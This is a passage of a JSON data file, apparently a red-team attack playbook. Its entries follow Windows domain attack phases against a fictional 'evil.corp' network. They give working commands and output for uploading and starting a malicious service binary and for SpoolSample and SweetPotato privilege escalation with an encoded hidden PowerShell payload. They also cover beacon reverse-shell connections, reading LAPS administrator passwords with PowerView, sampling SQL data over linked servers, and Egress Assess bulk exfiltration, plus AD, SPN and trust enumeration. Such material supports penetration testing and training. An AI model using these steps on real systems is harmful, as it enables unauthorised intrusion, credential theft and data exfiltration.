                "id": "defc3673-c714-4e82-94a8-bba9c8f9ae01",
                "name": "Upload Malicious Service Binary",
                "description": "Upload a malicious executable to the specified location on the server where the vulnerable service can access it. Example command could include a secure file transfer method.",
                "requirements": {
                    "file_path": "C:\\Payloads\\Service.exe"
                },
                "results": [
                    "UPLOAD:PAYLOAD_SERVICE.EXE"
                ]
            },
            {
                "id": "1b7f5c3d-e5e8-4dee-ab29-c9c8cda0f13b",
                "name": "Start Modified Service",
                "description": "Start the modified service, which now runs the malicious executable. Use the command: `sc start VulnService`.",
                "requirements": {},
                "results": [
                    "ACTION:VULN_SERVICE_STARTED"
                ]
            },
            {
                "id": "119def81-3c92-4eb2-b5a2-72b4288a8c0a",
                "name": "Connect to Beacon",
                "description": "If using a beacon for remote command execution, establish a connection to the local listener. Command: `beacon> connect localhost 4444`.",
                "requirements": {},
                "results": [
                    "CONNECTION:BEACON_ESTABLISHED"
                ]
            }
        ]
    },
    {
        "id": "dacc4358-e199-4d19-bd6e-a5c225978bf4",
        "name": "Printer Bug",
        "phase": "05. Privilege Escalation",
        "ttp": "T1210",
        "external": false,
        "description": "Priv Escalation via PrinterBug",
        "content": "## Tools\n########\n########",
        "category": "Vulnerabilities",
        "stealthy": false,
        "changes": [
            "\n## [[SpoolSample]]\n[[Kerberos/Printer Bug]]\n``````beacon\nbeacon> execute-assembly C:\\Tools\\SpoolSample\\SpoolSample\\bin\\Debug\\SpoolSample.exe dc-2 srv1\n\n[+] Converted DLL to shellcode\n[+] Executing RDI\n[+] Calling exported function\n``````",
            "\n## [[SweetPotato]]\n[[Kerberos/Printer Bug]] [[SQL Privilege Escalation]]\n```beacon\nbeacon> execute-assembly C:\\Tools\\SweetPotato\\bin\\Debug\\SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc SQBFAF[...snip...]ApAA==\"\n\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n[+] Attempting NP impersonation using method PrintSpoofer to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering notification on evil PIPE \\\\sql01/pipe/7365ffd9-7808-4a0d-ab47-45850a41d7ed\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n\nbeacon> connect localhost 4444\n[*] Tasked to connect to localhost:4444\n[+] host called home, sent: 20 bytes\n[+] established link to child beacon: 10.10.18.221\n```"
        ],
        "tools": [
            "SpoolSample",
            "SweetPotato"
        ],
        "steps": [
            {
                "id": "cfcd208495d565ef66e7d92b3c6f3b9c",
                "name": "Execute SpoolSample",
                "description": "Run the SpoolSample executable to test for DLL to shellcode conversion and RDI execution for privilege escalation.",
                "requirements": {},
                "results": [
                    "SP:SUCCESS",
                    "SP:EXECUTION"
                ]
            },
            {
                "id": "cfc4b982bc13430d896b0abe98c20cfc",
                "name": "Execute SweetPotato",
                "description": "Run the SweetPotato executable to attempt NP impersonation and escalate privileges using PrintSpoofer.",
                "requirements": {},
                "results": [
                    "SP:IMPERSONATION",
                    "SP:PROCESS:CREATED"
                ]
            },
            {
                "id": "a3cd0e98defe4a849f98ab34d7e9c7e3",
                "name": "Connect to Localhost",
                "description": "Establish a connection to localhost on port 4444 to ensure reverse shell connectivity after privilege escalation.",
                "requirements": {},
                "results": [
                    "CONN:ESTABLISHED",
                    "CONN:LOCALHOST"
                ]
            }
        ]
    },
    {
        "id": "eb910a47-68e9-436e-b016-94972cef4dcf",
        "name": "Certificate Store",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Search for the 'Cert Publishers' group in Active Directory.",
        "content": "# Certificate Store\n\nSearch for \"Cert Publishers\" group in AD\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b9c08604-4973-42bc-9739-de7c4c41ed57",
                "name": "Query 'Cert Publishers' Group",
                "description": "Use PowerShell to query Active Directory for the 'Cert Publishers' group. This will identify the group and its members if it exists.",
                "requirements": {
                    "tool": "PowerShell",
                    "access": "Sufficient privileges to query AD"
                },
                "results": [
                    "AD:GROUP:Cert Publishers",
                    "AD:MEMBERS:Cert Publishers"
                ]
            },
            {
                "id": "59214f87-e616-4b6d-b01e-04cc49e954b8",
                "name": "List Certificates in the Store",
                "description": "Access the certificates stored in the 'Cert Publishers' group\u2019s directory to examine their details and associated user accounts.",
                "requirements": {
                    "tool": "MMC Certificates Snap-in",
                    "access": "Domain Administrator privileges"
                },
                "results": [
                    "CERT:SUBJECT:User Certificate",
                    "CERT:ISSUER:CA",
                    "CERT:EXPIRATION:Date"
                ]
            },
            {
                "id": "78519f1b-4c3d-4a68-bcd6-bc1e9e1d75a4",
                "name": "Check Group Policy Objects",
                "description": "Investigate any Group Policy Objects (GPOs) linked to the 'Cert Publishers' group that might define permissions for certificate management.",
                "requirements": {
                    "tool": "GPMC (Group Policy Management Console)",
                    "access": "GPO Management permissions"
                },
                "results": [
                    "GPO:LINKED:Cert Publishers",
                    "GPO:PERMISSION:Management"
                ]
            }
        ]
    },
    {
        "id": "0603d9a4-0941-4583-b5a5-1df6e46878c3",
        "name": "Database Server",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Identify databases within the network",
        "content": "# Identify Databases\n[[Tools/PowerUpSQL]] can be used with the cmdlet `Get-SQLColumnSampleDataThreaded` in order to search one or more instances for databases that contain particular keywords in the column names.\n\n```beacon\nbeacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLColumnSampleDataThreaded -Keywords \"project\" -SampleSize 5 | select instance, database, column, sample | ft -autosize\n\nInstance                     Database Column      Sample         \n--------                     -------- ------      ------         \nsrv1.edu.evil.corp,1433 master   ProjectName Build Can       \nsrv1.edu.evil.corp,1433 master   ProjectName Fresh Boat     \nsrv1.edu.evil.corp,1433 master   ProjectName Fine Apple\n```\nTraversing is not possible! It only searches the available instances.\n\nTo search over the links use `Get-SQLQuery`.\n```beacon\nbeacon> powershell Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select * from openquery(\"\"sql1.evil.corp\"\", 'select * from information_schema.tables')\"\n\nTABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE\n------------- ------------ ----------            ----------\nmaster        dbo          spt_fallback_db       BASE TABLE\nmaster        dbo          spt_fallback_edu      BASE TABLE\nmaster        dbo          spt_fallback_usg      BASE TABLE\nmaster        dbo          MSreplication_options BASE TABLE\n\nbeacon> powershell Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select * from openquery(\"\"sql1.evil.corp\"\", 'select column_name from master.information_schema.columns')\"\n\ncolumn_name\n-----------\nCity\nName\nCar\nDog\n\nbeacon> powershell Get-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select * from openquery(\"\"sql1.evil.corp\"\", 'select top 5 City from master.dbo.VIPClients')\"\n\nCity  \n---------  \nHeidelberg\nMannheim\nFrankfurt\n```\n\n[Egress Assess](https://github.com/FortyNorthSecurity/Egress-Assess) can be used to exfiltrate lots of data at once\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list MS-SQL Servers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql\n```\n\nTo list all attributes of MS-SQL Servers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql -filter full-data.\n```\n\nTo list all attributes of specific MS-SQL Server from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command ms-sql -name <computer name> \n```",
            "\n## [[BloodHound]]\nFinding potential MS SQL Admins, based on the assumption that the account running the SQL Service is also a sysadmin (which is very common);\n>MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p"
        ],
        "tools": [
            "ADReaper",
            "BloodHound"
        ],
        "steps": [
            {
                "id": "cbf537e4-d5a7-4c91-afab-c51d8ed2f39a",
                "name": "Identify accessible SQL instances",
                "description": "Use PowerUpSQL to find SQL instances within the domain that are accessible for further queries.",
                "requirements": {
                    "tool": "PowerUpSQL",
                    "access": "Valid credentials to the domain"
                },
                "results": [
                    "SQL_INSTANCE:ACCESSIBLE"
                ]
            },
            {
                "id": "f4112b1f-c2ab-4d00-a9da-f87d9a6274d1",
                "name": "Search databases for keywords",
                "description": "Execute the PowerUpSQL command to sample data in SQL databases containing a specific keyword (e.g., 'project') in the column names.",
                "requirements": {
                    "tool": "PowerUpSQL",
                    "access": "Valid access to the identified SQL instances"
                },
                "results": [
                    "DB:PROJECT_NAME",
                    "DB:PROJECT_SAMPLES"
                ]
            },
            {
                "id": "e2ee7ee2-e8dd-4ed4-af45-da1e507ca66b",
                "name": "Query database schema information",
                "description": "Perform SQL queries using PowerUpSQL to extract metadata from SQL databases. This includes table names and column names from specified instances.",
                "requirements": {
                    "tool": "PowerUpSQL",
                    "access": "Valid access to query the SQL instances"
                },
                "results": [
                    "TABLE_SCHEMA:TABLES",
                    "COLUMN_NAMES:SCHEMA_INFO"
                ]
            },
            {
                "id": "1ed20e3c-b490-44f1-803e-488b7157b05d",
                "name": "Exfiltrate data using Egress Assess",
                "description": "Use Egress Assess to conduct data exfiltration tests, extracting large sets of data from defined databases.",
                "requirements": {
                    "tool": "Egress Assess",
                    "access": "Valid access to target databases"
                },
                "results": [
                    "DATA:EXFILTRATED"
                ]
            },
            {
                "id": "dc643c4b-f1a7-4932-8c12-f8cbdd4d425e",
                "name": "List MS SQL Servers within the domain",
                "description": "Employ ADReaper to enumerate MS SQL Servers present in the specified domain using domain controller information.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain controller URL, username, and password"
                },
                "results": [
                    "SQL_SERVER:LIST"
                ]
            },
            {
                "id": "4420edd0-b2c0-4067-88c5-f61b608e86b6",
                "name": "Retrieve attributes of specific SQL Server",
                "description": "Query ADReaper for detailed attributes of a specific MS SQL Server by providing its name in the command.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain controller URL, username, and password"
                },
                "results": [
                    "SQL_SERVER_ATTRIBUTES:DETAILS"
                ]
            },
            {
                "id": "b5eac2ee-d356-4f3e-9319-fdde8ebf9a2c",
                "name": "Identify SQL Admins using BloodHound",
                "description": "Use BloodHound to query for potential MS SQL Server administrators based on user relationships and service accounts.",
                "requirements": {
                    "tool": "BloodHound",
                    "access": "Valid access to the BloodHound database"
                },
                "results": [
                    "SQL_ADMIN:IDENTIFIED"
                ]
            }
        ]
    },
    {
        "id": "c06ed08c-3ef2-405e-9b00-10ddf90947ae",
        "name": "Domain SPN",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Identify databases within the network",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list SPNs available in the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command spn\n```\n\nTo list all attributes of Specific SPN from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command spn -name <sam of spn>\n```"
        ],
        "tools": [
            "ADReaper"
        ],
        "steps": [
            {
                "id": "5d55f792-7980-4a38-93c1-8833be1922fa",
                "name": "List Available SPNs in Domain",
                "description": "Use ADReaper to list all Service Principal Names (SPNs) available in the specified domain controller. This helps in identifying services associated with accounts in the domain.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials with permission to query SPNs"
                },
                "results": [
                    "SPN:LIST"
                ]
            },
            {
                "id": "da1c9cb2-15bc-4e35-8ffa-89b8c5130ecb",
                "name": "Retrieve Attributes of Specific SPN",
                "description": "Use ADReaper to retrieve all attributes of a specific SPN in the domain. This provides detailed information about the service, such as account details and configuration.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Domain credentials with permission to query SPNs"
                },
                "results": [
                    "SPN:ATTRIBUTES"
                ]
            }
        ]
    },
    {
        "id": "4bd15813-9fa9-43ff-8e7a-fc8a36ca9b23",
        "name": "Domain Trust",
        "phase": "06. Domain Enumeration",
        "ttp": "T1482",
        "external": false,
        "description": "Identify databases within the network",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo query the Trust Attributes of the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command domain-trust\n```"
        ],
        "tools": [
            "ADReaper"
        ],
        "steps": [
            {
                "id": "e4e1e384-79d4-4aa4-81a2-254d88a7c5e5",
                "name": "Set Up ADReaper Environment",
                "description": "Prepare the working directory for ADReaper execution by ensuring the executable and necessary files are present.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Read/Execute permissions"
                },
                "results": [
                    "ADREAPER:READY"
                ]
            },
            {
                "id": "506c7d19-be8c-4e3d-ac4e-fd07bc1edff9",
                "name": "Query Domain Trust Attributes",
                "description": "Execute ADReaper to query the domain trust attributes by connecting to the specified domain controller with valid credentials.",
                "requirements": {
                    "tool": "ADReaper",
                    "access": "Valid domain user credentials"
                },
                "results": [
                    "DOMAIN_TRUST:EXIST",
                    "TRUST_INFO:DETAILS"
                ]
            },
            {
                "id": "f5e2d412-0a82-472f-a95c-9d7d73f34bc4",
                "name": "Review Output for Domain Trust",
                "description": "Examine the output from the ADReaper command to identify trusted domains and related attributes.",
                "requirements": {},
                "results": [
                    "TRUST:DOMAIN_X",
                    "TRUST:LEVEL:Y"
                ]
            }
        ]
    },
    {
        "id": "1ffb2611-d1b6-4414-99fa-c38c1832a351",
        "name": "PAM",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Privilege Access Management enumeration can reveal sensitive account and role information.",
        "content": "# Privilege Access Management\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "fae69c5e-6b5e-4af9-9950-368d0cf95c09",
                "name": "List Users with PAM Roles",
                "description": "Query the PAM system to list all users that have been assigned specific privilege roles. You may need to access PAM management tools or APIs to retrieve this information.",
                "requirements": {},
                "results": [
                    "USER:NAME",
                    "ROLE:ASSIGNED"
                ]
            },
            {
                "id": "58d43c93-c780-469a-a3e8-cf4c47e5d436",
                "name": "Check PAM Audit Logs",
                "description": "Examine the PAM audit logs for specific events related to privilege escalations. These logs can often be found in system-specific paths or centralized logging solutions.",
                "requirements": {},
                "results": [
                    "EVENT:ESCALATION",
                    "USER:NAME"
                ]
            },
            {
                "id": "fcafe347-78a2-426f-b601-cc024193dbe2",
                "name": "Enumerate PAM Configuration Settings",
                "description": "Retrieve the PAM configuration settings to see defined policies and roles. Configuration files are typically located in standard directories such as /etc/security or /etc/pam.d for Unix-like systems.",
                "requirements": {},
                "results": [
                    "CONFIG:POLICY",
                    "CONFIG:ROLE"
                ]
            },
            {
                "id": "a24cc798-f51e-4a8e-adc8-6b1c1689ee0b",
                "name": "Identify PAM Registered Applications",
                "description": "Check the PAM configuration files for applications that are registered for PAM operations. This can involve reviewing files in the PAM module directories.",
                "requirements": {},
                "results": [
                    "APP:REGISTERED",
                    "APP:METHOD"
                ]
            }
        ]
    },
    {
        "id": "d76a4fbf-9eb0-4596-90f0-d77a98b55ff0",
        "name": "SCCM",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "# SCCM\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "58bfa3c9-896d-4e84-bc75-2996fb005e00",
                "name": "Query SCCM Database for Systems",
                "description": "Execute a SQL query to the SCCM database to retrieve system information. This helps identify systems that are managed by SCCM.",
                "requirements": {
                    "access": "Access to the SCCM SQL server and appropriate permissions to run SQL queries."
                },
                "results": [
                    "SYS:LIST"
                ]
            },
            {
                "id": "b492c7f5-7581-4a4c-9ad3-acd8b73f090d",
                "name": "Enumerate Client Configuration",
                "description": "Access the Configuration Manager console and navigate to 'Assets and Compliance' > 'Devices' to list all client configurations. This tests the visibility of device policies applied.",
                "requirements": {
                    "access": "Access to the SCCM Configuration Manager console."
                },
                "results": [
                    "CONFIG:ACTIVE",
                    "CONFIG:INACTIVE"
                ]
            },
            {
                "id": "bc8e3ca1-8cae-400b-8008-fae47dd14d24",
                "name": "Check SCCM Logs for Errors",
                "description": "Review the SCCM log files located in 'C:\\Program Files\\Microsoft Configuration Manager\\Logs' for any errors that may indicate problems with clients. This helps in identifying issues affecting system management.",
                "requirements": {
                    "access": "Local or remote access to the SCCM server file system."
                },
                "results": [
                    "LOG:ERROR"
                ]
            },
            {
                "id": "a4ce5aa2-28de-420c-90f3-83f3abd0807b",
                "name": "List SCCM Client Versions",
                "description": "Run a command in the SCCM console to query client versions on the managed systems, helping to identify any outdated clients.",
                "requirements": {
                    "access": "Access to the SCCM Management console."
                },
                "results": [
                    "CLIENT:VERSION"
                ]
            },
            {
                "id": "42d1e4e3-abcdef12-4567-8901-112233445566",
                "name": "Examine SCCM Collections",
                "description": "List all SCCM collections using PowerShell command 'Get-CMCollection' which enumerates all the collections available in SCCM. This helps in assessing how systems are grouped for management.",
                "requirements": {
                    "access": "PowerShell access with SCCM Cmdlets installed."
                },
                "results": [
                    "COLLECTION:LIST"
                ]
            }
        ]
    },
    {
        "id": "795b42bb-fe09-4c50-bdac-082128ee4a38",
        "name": "Web Server",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "Identify web server within the network via domain",
        "content": "# Web Server\nInternal web apps are incredibly prevalent and are a great source of data. Think SharePoint, Confluence, ServiceNow, SIEMs and so on.\n\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "EyeWitness",
            "GoWitness"
        ],
        "steps": [
            {
                "id": "c8f03357-10a9-4111-b48e-95c02f84f826",
                "name": "Identify Active Hosts",
                "description": "Perform a ping sweep on the target subnet to identify active IP addresses. You can use the command 'ping -c 1 <target_ip>' or any other scanning tool to determine live hosts.",
                "requirements": {},
                "results": [
                    "HOST:ACTIVE"
                ]
            },
            {
                "id": "a5edbc96-76eb-4697-89d5-97e2c745c7b2",
                "name": "Check for Open Ports",
                "description": "Use a port scanner to identify open ports on the live hosts identified in the previous step. Commands could include 'nmap <target_ip>' to discover open ports.",
                "requirements": {},
                "results": [
                    "PORT:OPEN"
                ]
            },
            {
                "id": "63e3c902-e999-4d8f-b0cb-f349abcb1484",
                "name": "Gather HTTP Services",
                "description": "Use a tool like 'nmap' with the '-sV' option to service version scan on open ports. This helps identify any web services running on those ports: 'nmap -sV <target_ip>'.",
                "requirements": {},
                "results": [
                    "SERVICE:HTTP",
                    "SERVICE:HTTPS"
                ]
            },
            {
                "id": "f5a96332-6fb9-4082-ac88-bb1bbaeadce8",
                "name": "Run EyeWitness for Web Apps",
                "description": "Execute EyeWitness on identified web services to automate screenshots and gather information about the web applications. Use 'EyeWitness.py -f <target_list.txt> --web' after creating a list of targets.",
                "requirements": {},
                "results": [
                    "WEBSERVER:SCREENSHOT"
                ]
            },
            {
                "id": "e09d8432-4315-4d9f-aea0-9bacd1d7b682",
                "name": "Capture Web Application Info with GoWitness",
                "description": "Utilize GoWitness to take screenshots and gather other info on the identified web servers. Command: 'gowitness single <url>' for each web application.",
                "requirements": {},
                "results": [
                    "WEBSERVER:DETAILS"
                ]
            }
        ]
    },
    {
        "id": "6468c4ec-587c-44d4-bc62-532a8b5ffe1c",
        "name": "Domain Admins",
        "phase": "06. Domain Enumeration",
        "ttp": "T1087.002",
        "external": false,
        "description": "Identifying Domain Admin group members in a Windows domain environment.",
        "content": "# Domain Admins\n\n## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "8c2f4d28-0e89-4ed2-b57f-283ed5ae1433",
                "name": "Query Domain Admins Group",
                "description": "Use the 'Get-ADGroupMember' command to list all the members of the 'Domain Admins' group in Active Directory. This command can be executed on a domain controller or any machine with the necessary permissions and Active Directory module installed.",
                "requirements": {
                    "permissions": "Read access to Active Directory",
                    "environment": "PowerShell with Active Directory module"
                },
                "results": [
                    "CRED:DOMAIN_ADMIN_MEMBERS"
                ]
            },
            {
                "id": "b73f4027-7988-420c-9e9f-6e1d8c79e79b",
                "name": "Check Group Membership via LDAP Query",
                "description": "Perform an LDAP search against the Active Directory to retrieve members of the 'Domain Admins' group. Use the appropriate LDAP filter to find entries where the 'memberOf' attribute indicates domain admin membership.",
                "requirements": {
                    "permissions": "Bind user with LDAP query capabilities",
                    "environment": "LDAP tooling"
                },
                "results": [
                    "CRED:DOMAIN_ADMIN_MEMBERS_LDAP"
                ]
            },
            {
                "id": "0f81d22e-fc68-4e07-a926-5962670162a6",
                "name": "Review Event Logs for Admin Access",
                "description": "Check the Security event logs for Event ID 4728, which indicates a member was added to a security-enabled global group, specifically the 'Domain Admins' group. This helps in auditing changes to the group membership.",
                "requirements": {
                    "permissions": "Access to Event Viewer with security log permissions",
                    "environment": "Windows Event Viewer"
                },
                "results": [
                    "CRED:DOMAIN_ADMIN_CHANGE_LOG"
                ]
            },
            {
                "id": "5fe11213-4f79-41e6-bd9f-660c8d0947b2",
                "name": "Enumerate Local Group Membership",
                "description": "Use 'net localgroup' command to enumerate local groups on a domain joined machine to see if domain admins have local privileges as well. This checks for the local 'Administrators' group and its members.",
                "requirements": {
                    "permissions": "Local user privileges on the machine",
                    "environment": "Command Prompt"
                },
                "results": [
                    "CRED:LOCAL_ADMIN_MEMBERS"
                ]
            },
            {
                "id": "f759e4b3-bc11-4e4a-8703-de8acf82fb1e",
                "name": "Fetch Group SID for Domain Admins",
                "description": "Retrieve the Security Identifier (SID) for the 'Domain Admins' group to ensure accurate identification and confirm that no unauthorized users are part of the group.",
                "requirements": {
                    "permissions": "Read access to Active Directory",
                    "environment": "PowerShell or Command Prompt"
                },
                "results": [
                    "CRED:DOMAIN_ADMINS_SID"
                ]
            }
        ]
    },
    {
        "id": "a91401ae-1c52-4657-9be3-1a48c0707a4f",
        "name": "Domain Computers",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
            "\n## [[ADReaper]]\nTo list all available Computers from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers\n```\n\nTo list all Computers with attributes from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers -filter full-data\n```\n\nTo list attributes of Specific Computer from the domain,\n```\n.\\ADReaper.exe -dc <dc.domain> -user <username> -password <password> -command computers -name <computer name>\n```",
            "\n## [[PowerView]]\n### Machines within OU\n\n```powershell\nGet-DomainComputer | ? { $_.DistinguishedName -match \"OU=Tier 1\" } | select DnsHostName\n\ndnshostname            \n-----------            \nsrv1.edu.evil.corp\n```\n\n### Get Property of Domain Object\n\n```powershell\nGet-DomainObject -Identity wkstn2 -Properties ms-Mcs-AdmPwd\n\nms-mcs-admpwd \n------------- \npassword123.\n```",
            "\n## [[PowerView]]\n[[Local Administrator Password Solution (LAPS)]]\n### Search computers with property\n\nFilter: `ms-Mcs-AdmPwdExpirationTime` not null\n\n```powershell\nGet-DomainObject -SearchBase \"LDAP://DC=edu,DC=evil,DC=corp\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname\n\ndnshostname              \n-----------              \nwkstn1.edu.evil.corp\nwkstn2.edu.evil.corp\n```"
        ],
        "tools": [
            "ADReaper",
            "NMAP",
            "PowerView"
        ],
        "steps": [
            {
                "id": "ccac4bc6-dcea-4e91-8446-5ff7005530d8",
                "name": "List all Computers in Domain",
                "description": "Execute ADReaper to list all available computers in the target domain. The command connects to a specified domain controller using provided user credentials.",
                "requirements": {},
                "results": [
                    "COMPUTER:LIST"
                ]
            },
            {
                "id": "1af72b78-376e-4e77-908e-1ff74c15ef7c",
                "name": "List Computers with Full Data",
                "description": "Use ADReaper to retrieve a detailed list of all computers, including their attributes, from the domain.",
                "requirements": {},
                "results": [
                    "COMPUTER:FULLDATA"
                ]
            },
            {
                "id": "1e04512f-9abc-42d7-b403-77897327a86b",
                "name": "Retrieve Specific Computer Attributes",
                "description": "Run ADReaper to fetch detailed attributes of a specific computer from the domain using its name.",
                "requirements": {},
                "results": [
                    "COMPUTER:ATTRIBUTES"
                ]
            },
            {
                "id": "745f6e2a-7d3f-48f3-b798-9e323fcf8f94",
                "name": "List Computers in Specific OU",
                "description": "Employ PowerView to list all domain computers that exist within a specific Organizational Unit (OU), filtering by Distinguished Name.",
                "requirements": {
                    "PowerShell": "Installed and Running"
                },
                "results": [
                    "COMPUTER:OU_LIST"
                ]
            },
            {
                "id": "633834f5-134c-4c77-bb38-fb17024e255a",
                "name": "Get Domain Object Property",
                "description": "Use PowerView to retrieve the specified property (ms-Mcs-AdmPwd) of a particular domain object based on its identity.",
                "requirements": {
                    "PowerShell": "Installed and Running"
                },
                "results": [
                    "COMPUTER:ADMIN_PASSWORD"
                ]
            },
            {
                "id": "b62e489e-89e7-43dd-92c7-d57350a5cbe8",
                "name": "Search for Computers with LAPS",
                "description": "Query the domain for computers that have a non-null value for LAPS property (ms-Mcs-AdmPwdExpirationTime). This identifies computers managed by the Local Administrator Password Solution.",
                "requirements": {
                    "PowerShell": "Installed and Running"
                },
                "results": [
                    "COMPUTER:LAPS_MANAGED"
                ]
            }
        ]
    },
    {
        "id": "f9352355-9d08-44f0-be7a-ccdf9d304007",
        "name": "Domain Controller",
        "phase": "06. Domain Enumeration",
        "ttp": "T1046",
        "external": false,
        "description": "NoDescription",
        "category": "Domain Objects",
        "stealthy": false,
        "tools": [
            "ADReaper",
            "Net",
            "nmcli",
            "Nslookup",
            "PowerView",
            "SharpHound"
        ],
        "steps": [
            {
                "id": "2b74f972-df5a-40c4-9871-9091facf67cf",
                "name": "Set Environment Variable",
                "description": "Set the environment variable to list all available environment variables.",
                "requirements": {},
                "results": [
                    "ENV:SET"
                ]
            },
            {
                "id": "67dcb71e-86ee-4c42-aba3-e48be7c646b4",
                "name": "Retrieve Logon Server",
                "description": "Echo the logon server in use. This provides information about which Domain Controller the user is authenticated against.",
                "requirements": {},
                "results": [
                    "LOGON:SERVER"
                ]
            },
            {
                "id": "b5b97938-a884-4ad0-9e35-432b9a7ed815",
                "name": "Query Domain Controllers with ADReaper",
                "description": "Use ADReaper to query the properties of Domain Controllers in the domain. Replace <dc.domain>, <username>, and <password> with actual values.",
                "requirements": {
                    "ADReaper": {},
                    "credentials": {}
                },
                "results": [
                    "DC:INFO"
                ]
            },
            {
                "id": "9c43469c-ed7b-4d20-b1e7-ed9743e1f4b3",
                "name": "List Domain Controllers using Net",
                "description": "Execute the command to list all Domain Controllers in the domain from a domain-joined device.",
                "requirements": {},
                "results": [
                    "DC:LIST"
                ]
            },
            {
                "id": "4be12a87-1d20-414e-8664-ef693499c1ed",
                "name": "Show Domain Name and DNS with nmcli",
                "description": "Use nmcli to show the domain name and DNS configuration for the eth0 interface.",
                "requirements": {
                    "nmcli": {}
                },
                "results": [
                    "DOMAIN:NAME",
                    "DNS:CONFIG"
                ]
            },
            {
                "id": "4b49d64f-572f-47a5-88ff-bd897b09de2e",
                "name": "DNS Lookup for Domain Services",
                "description": "Use nslookup to query various DNS records related to the Domain Controller. Replace <searchdomain> and <DC_FQDN> with actual values.",
                "requirements": {
                    "nslookup": {}
                },
                "results": [
                    "DNS:RECORDS"
                ]
            },
            {
                "id": "f5c14fdd-cf37-4ab3-895a-d1b0f4c96c67",
                "name": "Get Domain Controller Info with PowerView",
                "description": "Run a PowerShell command to retrieve information about Domain Controllers in the specified domain.",
                "requirements": {
                    "PowerView": {}
                },
                "results": [
                    "DC:INFO"
                ]
            },
            {
                "id": "ee8ebc94-e5fc-4bd3-a8b8-6f4e4f709c47",
                "name": "List DC via Trust with PowerView",
                "description": "Use PowerView to get Domain Controller information from a trusted external domain.",
                "requirements": {
                    "PowerView": {}
                },
                "results": [
                    "DC:TRUSTED"
                ]
            },
            {
                "id": "0fcc5c70-05d3-4c7a-a9de-1d7eb70c8282",
                "name": "Get DC via Trust with SharpHound",
                "description": "Use SharpHound to gather information about Domain Controllers from a trusted domain. Replace <domain> with the actual trusted domain name.",
                "requirements": {
                    "SharpHound": {}
                },
                "results": [
                    "DC:TRUSTED"
                ]
            }
        ]
    },
    {
        "id": "1b468064-9714-4c1b-8958-18411548482b",
        "name": "Domain Forest",
        "phase": "06. Domain Enumeration",
        "ttp": "T1482",
        "external": false,
        "description": "NoDescription",
        "content": "# Tools\n########\n########",
        "category": "Domain Objects",
        "stealthy": false,
        "changes": [
